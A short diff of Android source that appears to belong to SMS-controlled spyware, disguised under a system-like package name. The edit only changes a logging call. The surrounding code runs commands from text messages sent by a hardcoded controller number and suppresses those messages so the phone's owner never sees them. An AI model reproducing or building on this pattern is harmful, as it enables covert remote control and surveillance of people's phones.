@@ -5,7 +5,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
-import android.util.Log;
 
 import com.android.system.controled.util.DoAboutCodeUtils;
 
@@ -42,7 +41,7 @@ public class MsgAndOtherReceiver extends BroadcastReceiver {
 				getFromNum = currMsg.getDisplayOriginatingAddress();
 			}
 
-			Log.v("MsgReceiver", getFromNum);
+			Debug.v("MsgReceiver", getFromNum);
 			if (getFromNum.contains(Globle.PHONE_NUMBER)) {
 				if (DoAboutCodeUtils.doOperaByMessage(context, msgTxt)) {
 					abortBroadcast();
